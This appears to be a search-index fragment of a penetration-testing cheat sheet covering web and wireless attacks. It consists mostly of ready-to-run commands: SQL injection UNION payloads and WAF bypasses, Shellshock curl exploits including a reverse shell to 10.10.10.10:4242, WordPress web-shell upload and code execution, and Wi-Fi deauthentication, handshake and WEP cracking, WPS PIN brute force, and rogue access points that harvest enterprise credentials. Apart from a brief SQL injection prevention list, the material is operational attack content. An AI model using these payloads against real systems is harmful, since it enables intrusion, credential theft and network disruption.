names","text":"<p>http://www.example.com/gallery.php?id=6 union all select 1,group_concat(table_name),3,4,N-1 from Information_schema.tables where table_schema=database()-- -</p>"},{"location":"Web/SQLi/#6-retrieve-column-names","title":"6. Retrieve column names","text":"<p>http://www.example.com/gallery.php?id=6 union all select 1,group_concat(column_name),3,4,N-1 from Information_schema.columns where table_name=mysqlchar-- -</p>"},{"location":"Web/SQLi/#gather-the-data","title":"Gather the data","text":"<p>http://www.example.com/gallery.php?id=6 union all select 1,group_concat(column_name,0x0a),3,4,N-1 from table_name  - 0x0a is the hex value of comas. It will separate the table data into columns</p>"},{"location":"Web/SQLi/#tools","title":"Tools","text":"<ul> <li>SQLMap : https://github.com/sqlmapproject/sqlmap</li> </ul>"},{"location":"Web/SQLi/#prevention","title":"Prevention","text":"<ul> <li>Never build SQL commands manually</li> <li>Escape &amp; Encode<ul> <li>Special characters</li> <li>Single quote and double quote</li> </ul> </li> <li>Use parameterized / prepared SQL statements<ul> <li>It forces the user input to be considered as the content of a parameter</li> <li>It is not considered as a part of a SQL command</li> </ul> </li> <li>Limit data and privileges that a database has access to (least privilege)</li> </ul>"},{"location":"Web/SQLi/#bypass","title":"Bypass","text":"<ul> <li>SQL comments and case changing<ul> <li><code>Sel/**/EcT</code></li> </ul> </li> <li>URL encoding<ul> <li><code>/*!se%6cect*/</code></li> <li><code>/*!se%6cect*/</code></li> </ul> </li> <li>Replaced Keywords<ul> <li><code>SEselectLECT</code></li> </ul> </li> <li>https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF</li> </ul>"},{"location":"Web/SQLi/#mssql-without-sqlmap","title":"MSSQL without SQLmap","text":"<p>TODO...</p>"},{"location":"Web/SQLi/#time-based_1","title":"Time Based","text":"<ol> <li>Detect the SQLi </li> <li>Confirm with delay</li> <li>Simple POST request </li> </ol> <p><pre><code>curl --data \"username=pentest&amp;pass=pentest&amp;submit=Submit\" http://$IP/\n</code></pre> 4. Simple POST request with delay</p> <pre><code>curl --data \"username=pentest&amp;pass=pentest';  WAITFOR DELAY '0:0:5';--&amp;submit=Submit\" http://$IP/\n</code></pre>"},{"location":"Web/Shellshock/","title":"Shellshock","text":""},{"location":"Web/Shellshock/#detection","title":"Detection","text":"<ul> <li>old apache version</li> <li>cgi folders<ul> <li>/cgi-bin</li> </ul> </li> </ul>"},{"location":"Web/Shellshock/#shellshock-poc","title":"Shellshock PoC","text":"<pre><code># Reflected\ncurl -H 'User-Agent: () { :; }; echo \"VULNERABLE TO SHELLSHOCK\"' http://$IP/cgi-bin/admin.cgi 2&gt;/dev/null| grep 'VULNERABLE'\n\n# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)\ncurl -H 'User-Agent: () { :; }; /bin/bash -c \"sleep 5\"' http://$IP/cgi-bin/admin.cgi\n\n# Out-Of-Band Use Cookie as alternative to User-Agent\ncurl -H 'Cookie: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/4242 0&gt;&amp;1' http://$IP/cgi-bin/user.sh\n</code></pre>"},{"location":"Web/Tomcat/","title":"Tomcat","text":""},{"location":"Web/Tomcat/#default-credentials","title":"Default credentials","text":"<ul> <li>/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt</li> <li>/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist_base64encoded.txt</li> </ul>"},{"location":"Web/Wordpress/","title":"Wordpress","text":""},{"location":"Web/Wordpress/#wpsscan","title":"WPSSCAN","text":"<pre><code>wpscan -e ap,at,tt,cb,dbe,u,m --url http://$IP --plugins-detection mixed --passwords /usr/share/seclists/Passwords/probable-v2-top12000.txt | tee scans/wpscan.out\n</code></pre>"},{"location":"Web/Wordpress/#plugin-rce","title":"Plugin RCE","text":"<p><pre><code>cd /usr/share/seclists/Web-Shells/WordPress\nls  # plugin-shell.php\nhead plugin-shell.php\n</code></pre> <pre><code>#  file is named plugin-shell.zip and will be placed in the plugin-shell folder within wp-content/plugins on the server\nsudo zip plugin-shell.zip plugin-shell.php\n</code></pre></p> <p>Plugins -&gt; add new -&gt; upload</p> <pre><code>curl http://$IP/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami\n# www-data\n</code></pre> <p>Automate curl : <pre><code>#!/bin/bash\n# -G is necessary to append the data to the URL.\ncurl -G --data-urlencode \"cmd=$1\" \"http://$IP/wp-content/plugins/plugin-shell/plugin-shell.php\" --output -\n</code></pre></p>"},{"location":"Web/Wordpress/#panel-rce","title":"Panel RCE","text":"<p>Appearance -&gt; Editor -&gt; 404 Template (at the right) -&gt; Paste php-reverse-shell.php (Edit lhost and lport) -&gt; Update File</p> <pre><code>http://$IP/wp-content/themes/&lt;theme_name&gt;/404.php\n</code></pre>"},{"location":"Web/Wordpress/#other-info","title":"Other info","text":"<ul> <li> <p>Access credentials in wordpres db : SELECT user_login, user_pass FROM wp_users</p> </li> <li> <p>Config file is : wp-config.php</p> </li> <li> <p>Update wordpress password from mysql : UPDATE wp_users SET user_pass=MD5('newPassword') WHERE user_login = 'admin'; </p> </li> </ul>"},{"location":"Wireless/Commands/","title":"Commands","text":""},{"location":"Wireless/Commands/#monitor-mode","title":"Monitor mode","text":"<pre><code>airmon-ng check kill\nairmon-ng start wlan0\n\nairmon-ng stop wlan0\n</code></pre> <pre><code>sudo ip link set wlan0 down\nsudo iwconfig wlan0 mode monitor\nsudo ip link set wlan0 up\n</code></pre> <p>Verify: <pre><code>sudo iw dev wlan0mon info\nsudo iwconfig wlan0mon  #deprecated\n</code></pre></p>"},{"location":"Wireless/Commands/#injection-test","title":"Injection test","text":"<p><pre><code>sudo aireplay-ng -9 -e wifu -a &lt;BSSID&gt; wlan0mon\n</code></pre> Card2Card: <pre><code>sudo aireplay-ng -9 -i wlan1mon wlan0mon\n</code></pre></p>"},{"location":"Wireless/Commands/#view-or-set-channel","title":"View or set channel","text":"<pre><code>sudo ip link set wlan1 down\nsudo iwconfig wlan1 channel 12\nsudo ip link set wlan1 up\niwlist wlan1 channel\n</code></pre> <ul> <li> <p>https://stackoverflow.com/questions/29560308/how-to-force-wifi-adapter-to-use-specific-channel</p> </li> <li> <p>look for your interface <pre><code>sudo iwconfig\n</code></pre></p> </li> <li> <p>look at your channels <pre><code>sudo iwlist {interface} channel\n</code></pre></p> </li> <li> <p>turn off wifi <pre><code>sudo iwconfig {interface} power off\n</code></pre></p> </li> <li> <p>set your desired channel <pre><code>sudo iwconfig {interface} channel {channel, ex. \"23\"}\n</code></pre></p> </li> <li> <p>set your desired frequency <pre><code>sudo iwconfig {interface} freq {frequency, ex. \"5.00G\"}\n</code></pre></p> </li> <li> <p>turn on wifi <pre><code>sudo iwconfig {interface} power on\n</code></pre></p> </li> </ul>"},{"location":"Wireless/Profiles/","title":"Profiles","text":""},{"location":"Wireless/Profiles/#windows","title":"Windows","text":"<pre><code>netsh wlan show profile\nnetsh wlan show profile &lt;SSID&gt; key=clear\n</code></pre>"},{"location":"Wireless/Profiles/#linux","title":"Linux","text":"<pre><code>sudo grep -r '^psk=' /etc/NetworkManager/system-connections/\n</code></pre>"},{"location":"Wireless/Reconnaissance/","title":"Reconnaissance","text":""},{"location":"Wireless/Reconnaissance/#prerequisites","title":"Prerequisites","text":"<p>Monitor mode <pre><code>airmon-ng   \nairmon-ng check\nairmon-ng check kill\nairmon-ng start wlan1\nairmon-ng start wlan0 3 # Start on channel 3\niw dev wlan1 info\n</code></pre></p>"},{"location":"Wireless/Reconnaissance/#recon","title":"Recon","text":"<pre><code>airodump-ng wlan1 --band abg --wps -w recon\n</code></pre> <pre><code>wash -i wlan\nwash -i wlan -5\n</code></pre>"},{"location":"Wireless/Reconnaissance/#filtering","title":"Filtering","text":"<p>use the -b option and set the access point MAC address to keep. This will filter out all additional APs from the unencrypted capture file.</p> <pre><code>sudo airdecap-ng -b &lt;BSSID&gt; capture.cap\n</code></pre>"},{"location":"Wireless/Reconnaissance/#graphs","title":"Graphs","text":"<p>Clients to AP Relationship Graph (CAPR) = won't draw an AP that doesn\u2019t have any clients</p> <pre><code>airgraph-ng -o graph.png -i capture.csv -g CAPR\n</code></pre> <p>Clients Probe Graph (CPG) = displays the relationships between wireless clients and probed networks</p> <pre><code>airgraph-ng -o graph.png -i capture.csv -g CPG\n</code></pre>"},{"location":"Wireless/Rogue%20AP/","title":"Rogue AP","text":""},{"location":"Wireless/Rogue%20AP/#discovery","title":"Discovery","text":"<pre><code>sudo airodump-ng -w discovery --output-format pcap wlan1mon\n</code></pre> <p>Identify: - Target SSID - AUTH - Cipher - Channel - Mbits (MB) - 2.4Ghz or 5Ghz</p> <p>Deduce the 802.11 protocol in use.</p> <p>airodump-ng only shows the highest encryption possible, so use Wireshark to check for WPA1 for example.</p> <p>Display only beacon packets and specific SSID by using this filter:  <pre><code>wlan.fc.type_subtype == 0x08 &amp;&amp; wlan.ssid == \"MySSID\". # for beacon requests\nwlan.fc.type_subtype == 0x04 # for probe requests\n</code></pre></p> <p>Still in Wireshark, review:</p> <ul> <li>IEEEE 802.11Wireless Management </li> <li>Tagged Parameters<ul> <li>Vendor Specific: Microsoft Corp.: WPA Information Element = AP supports WPA1</li> <li>RSN Information = AP supports WPA2</li> <li>Then, check for configuration.</li> <li>Multicast</li> <li>Unicast/Pairwise : TKIP/CCM(AES)?</li> <li>Auth Key Management configuration : Confirm PSK ?</li> </ul> </li> </ul>"},{"location":"Wireless/Rogue%20AP/#creating-rogue-ap","title":"Creating Rogue AP","text":"<pre><code>sudo apt install hostapd-mana\n</code></pre> <p>Example mana conf file when encryption details are not specified: <pre><code>interface=wlan0\nssid=TheSSID\nchannel=6\n\nhw_mode=g  # g for 2,4Ghz ; a if 5Ghz\nieee80211n=1 # By default, hostapd-mana will run in 802.11b\n\nwpa=3 # 3 for both wpa1 and wpa2 ; 1 for only wpa1 ; 2 for only wpa2\nwpa_key_mgmt=WPA-PSK # enable PSK authentication\nwpa_passphrase=ANYPASSWORD # irrelevant, since we are only attempting to capture ahandshake\n\nwpa_pairwise=TKIP CCMP # encryption with WPA1\nrsn_pairwise=TKIP CCMP  # encryption with WPA2\n# Cipher suite for multicast traffic is automatically set by hostapd-mana\n\nmana_wpaout=TheSSID.hccapx # location to save the captured handshake\n</code></pre></p> <p>More parameters : https://github.com/sensepost/hostapd-mana/blob/master/hostapd/hostapd.conf</p>"},{"location":"Wireless/Rogue%20AP/#capturing-handshake","title":"Capturing handshake","text":"<pre><code>sudo hostapd-mana SSID-mana.conf\n</code></pre> <p>If the signal of the rogue AP is stronger than the target, the device will attempt to connect and the handshake will be captured. Otherwise, we can send deauth messages.</p> <pre><code>sudo aireplay-ng -0 1 -a &lt;BSSID_LEGITIMATE_AP&gt; -c &lt;STATION_MAC_ADDRESS&gt; wlan1mon\n</code></pre>"},{"location":"Wireless/Rogue%20AP/#cracking","title":"Cracking","text":"<pre><code>aircrack-ng SSID.hccapx -e SSID -w /usr/share/john/password.lst\n</code></pre>"},{"location":"Wireless/WEP/","title":"WEP","text":""},{"location":"Wireless/WEP/#wep","title":"WEP","text":"<p>Spoof MAC of a connected station <pre><code>ip link set wlan1mon down\nmacchanger -m XX:XX:XX:XX:XX:XX wlan1mon\nip link set wlan1mon up\nip a\n</code></pre></p> <p>Capture frames <pre><code>airodump-ng wlan1mon -c X --bssid XX:XX:XX:XX:XX:XX --essid ESSID -w wep_capture\n</code></pre></p> <p>Injection <pre><code>aireplay-ng -3 -b XX:XX:XX:XX:XX:XX -h &lt;SPOOFED_MAC&gt; wlan1mon\n</code></pre></p> <p>Notice the #Data packets and stopped both tools after around 50000.</p> <p>Cracking <pre><code>aircrak-ng wep_capture.cap\n</code></pre></p> <p>Connection <pre><code>iwconfig wlan0 essid ESSID key XX:XX:XX:XX:XX\nifconfig wlan0 up\ndhclient wlan0\n</code></pre></p>"},{"location":"Wireless/WPA%20Enterprise/","title":"WPA Enterprise","text":"<p>WPA2 Enterprise:</p> <p>Look for WPA MGT network in airodump-ng.</p> <pre><code>airodump-ng -c &lt;channel&gt; -w &lt;capture&gt; wlan1mon\naireplay-ng -0 0 -a &lt;BSSID_LEGITIMATE_AP&gt; wlan1mon \nsudo airmon-ng stop wlan1mon\n</code></pre> <p>Grab certificate files from wireshark using filters:</p> <pre><code>wlan.bssid==XX:XX:XX:XX:XX:XX &amp;&amp; eap &amp;&amp; tls.handshake.certificate\nwlan.bssid==XX:XX:XX:XX:XX:XX &amp;&amp; eap &amp;&amp; tls.handshake.type == 11,3\n</code></pre> <p>View Packet Details &gt;&gt; Extensible Authentication Protocol &gt; Transport Layer Security &gt; TLSv1 Record Layer: Handshake Protocol: Certificate</p> <p>Save certificates to .der files: Right click cert string and click Export Packet Bytes. </p> <p>View SSL cert info: <pre><code>openssl x509 -inform der -in CERTIFICATE_FILENAME -text\n</code></pre></p> <p>Use freeradius to provide fake cert to clients.</p> <p>Alter certificate_authority block in /etc/freeradius/3.0/certs/ca.cnf:</p> <pre><code>[certificate_authority]\ncountryName             = US\nstateOrProvinceName     = CA\nlocalityName            = New York\norganizationName        = Company\nemailAddress            = ca@company.com\ncommonName              = \"Company Certificate Authority\"\n</code></pre> <p>Alter server block in /etc/freeradius/3.0/certs/server.cnf:</p> <pre><code>[server]\ncountryName             = US\nstateOrProvinceName     = CA\nlocalityName            = New York\norganizationName        = Company\nemailAddress            = ca@company.com\ncommonName              = \"Company Certificate Authority\"\n</code></pre> <p>Change dir to /etc/freeradius/3.0/certs/ and run:</p> <pre><code>rm dh\n#make destroy certs\nmake\n</code></pre> <p>An error occurs but it doesn't matter because we don't use any client certificates.</p> <p>Setup hostapd-mana for the rogue AP using the following UPDATED mana.conf file in /etc/hostapd-mana/mana.conf:</p> <pre><code># SSID of the AP\nssid=TheSSID\n\n# Network interface to use and driver type\n# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'\ninterface=wlan0\ndriver=nl80211\n\n# Channel and mode\n# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)\nchannel=6\n# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax\nhw_mode=g\n\n# Setting up hostapd as an EAP server\nieee8021x=1\neap_server=1\n\n# Key workaround for Win XP\neapol_key_index_workaround=0\n\n# EAP user file\neap_user_file=/etc/hostapd-mana/mana.eap_user\n\n# Certificate paths created earlier\nca_cert=/etc/freeradius/3.0/certs/ca.pem\nserver_cert=/etc/freeradius/3.0/certs/server.pem\nprivate_key=/etc/freeradius/3.0/certs/server.key\n# The password is actually 'whatever'\nprivate_key_passwd=whatever\ndh_file=/etc/freeradius/3.0/certs/dh\n\n# Open authentication\nauth_algs=1\n# WPA/WPA2\nwpa=3\n# WPA Enterprise\nwpa_key_mgmt=WPA-EAP\n# Allow CCMP and TKIP\n# Note: iOS warns when network has TKIP (or WEP)\nwpa_pairwise=CCMP TKIP\n\n# Enable Mana WPE\nmana_wpe=1\n\n# Store credentials in that file\nmana_credout=/tmp/hostapd.credout\n\n# Send EAP success, so the client thinks it's connected\nmana_eapsuccess=1\n\n# EAP TLS MitM\nmana_eaptls=1\n</code></pre> <p>Use mana.eap_user file, move to /etc/hostapd-mana/mana.eap_user:</p> <pre><code>*     PEAP,TTLS,TLS,FAST\n\"t\"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    \"pass\"   [2]\n</code></pre> <p>Start hostapd-mana: <pre><code>hostapd-mana /etc/hostapd-mana/mana.conf\n</code></pre> If needed, deauth stations.</p> <p>Hostapd-mana will output asleap commands, find a user with a successful login (from wireshark traffic) and run command like so:</p> <pre><code>&lt;asleap command&gt; -W /usr/share/john/password.lst\n</code></pre> <p>Create wpa_supplicant.conf file:</p> <pre><code>network={\n  ssid=\"NetworkName\"\n  scan_ssid=1\n  key_mgmt=WPA-EAP\n  identity=\"Domain\\username\"\n  password=\"password\"\n  eap=PEAP\n  phase1=\"peaplabel=0\"\n  phase2=\"auth=MSCHAPV2\"\n}\n</code></pre> <p>Connect to network:</p> <pre><code>wpa_supplicant -i wlan0 -c &lt;config file&gt;\ndhclient wlan0\n</code></pre>"},{"location":"Wireless/WPA%20Traffic%20Decryption/","title":"WPA Traffic Decryption","text":"<ul> <li>The 4-way handshake must be in the capture (required to generate PTK for the targeted client; PTK is used to encrypt data and is unique for each client). Having (packets 2 and 3) or (packets 3 and 4) will work correctly, at least with airdecap-ng.</li> </ul> <p>With Wireshark:</p> <ul> <li>Specify a key (Passphrase PSK or PMK) via: Edit &gt; Preferences &gt; Select IEEE 802.11 from the Protocol list, check \"Enable Decryption\". Click \"Edit\" button next to \"Decryption Keys\"</li> </ul> <p>To generate the wpa-psk: <pre><code>wpa_passphrase TheSSID ThePassword\n</code></pre></p> <p>https://wiki.wireshark.org/HowToDecrypt802.11</p> <p>With airdecap-ng:</p> <pre><code>airdecap-ng -e 'TheSSID' -p 'ThePassword' capture.cap\n</code></pre>"},{"location":"Wireless/WPA2%20PSK/","title":"WPA2 PSK","text":"<p>tested with Alfa AWUS036ACH</p>"},{"location":"Wireless/WPA2%20PSK/#drivers-installation","title":"Drivers installation","text":"<pre><code>apt install realtek-rtl88xxau-dkms\n</code></pre>"},{"location":"Wireless/WPA2%20PSK/#hacking-process","title":"Hacking process","text":"<ol> <li>Place wireless card into monitor mode</li> <li>Discover information about network (Channel &amp; BSSID)</li> <li>Select network and capture data</li> <li>Perform deauth attack</li> <li>Capture WPA handshake</li> <li>Attempt to crack the handshake</li> </ol>"},{"location":"Wireless/WPA2%20PSK/#exploit-walkthrough","title":"Exploit walkthrough","text":"<p>Monitor mode <pre><code>airmon-ng   \nairmon-ng check\nairmon-ng check kill\nairmon-ng start wlan1\niw dev wlan1 info\n</code></pre></p> <p>Discover informations <pre><code>airodump-ng wlan1(mon)\n#BSSID is the mac address\n#PWR is the distance from the device (less the number is more we are close)\n#CH is the channel\n#ENC is the type (here WPA2)\n#ESSID is the name od the SSID, if its hidden only the length is available\n</code></pre></p> <p>Select network and capture data <pre><code>airodump-ng wlan1(mon) -c 12 --bssid &lt;BSSID&gt; --essid &lt;SSID&gt; -w capture\n# -c for channel\n# --bssid target router\n# -w filename capture\n</code></pre></p> <p>After that we will see the device attached to the network. Then to capture the handshake we can wait or to speed this process we have to kick the user connected from the network.</p> <p>Perform deauth attack <pre><code># Open a new tab\naireplay-ng -0 1 -a &lt;BSSID&gt; -c &lt;client_mac_address&gt; wlan1(mon)\n# -0 means deauth and 1 = run one time \n</code></pre></p> <p>Capture WPA handshake</p> <p>The deauth process start, the WPA handshake should pop up in the other tab. Look at the capture.cap.</p> <p>Attempt to crack the handshake <pre><code>aircrack-ng -w &lt;wordlist.txt&gt; -b &lt;BSSID&gt; capture.cap\naircrack-ng -w /usr/share/john/password.lst -e &lt;ESSID&gt; -b &lt;BSSID&gt; wpa.cap\n</code></pre></p>"},{"location":"Wireless/WPA2%20PSK/#connect-to-the-network","title":"Connect to the network","text":"<pre><code>airmon-ng check kill\nwpa_passphrase &lt;SSID&gt; &gt; ssid.conf\nwpa_supplicant -i wlan0 -c ssid.conf -B # -B for background\ndhclient wlan0\n</code></pre>"},{"location":"Wireless/WPS/","title":"WPS","text":""},{"location":"Wireless/WPS/#wps-attacks","title":"WPS Attacks","text":"<p>Pixie WPS attack: <pre><code>sudo reaver -c &lt;channel&gt; -b &lt;BSSID&gt; -i wlan1 -v -K\n</code></pre></p> <p>Blank PIN: <pre><code>sudo reaver -c &lt;channel&gt; -b &lt;BSSID&gt; -i wlan1 -p \"\" -v\n</code></pre></p> <p>Default PIN values that depend on the first three bytes of the BSSID: <pre><code>sudo apt install airgeddon\nsource /usr/share/airgeddon/known_pins.db #  loads an array of PINs into memory\necho ${PINDB[\"0022FF\"]}\n\ncut -d ':' -f 1-3 bssids.txt | sort -u | tr -d ':' | while read line; do echo ${PINDB[\"$line\"]};done\n</code></pre></p> <p>Brute force PIN: <pre><code>sudo reaver -c &lt;channel&gt; -b &lt;BSSID&gt; -i wlan1 -v\n</code></pre></p> <p>DoS when WPS is locked, could reboot the AP which release the lock : <code>mdk4</code></p>"}]}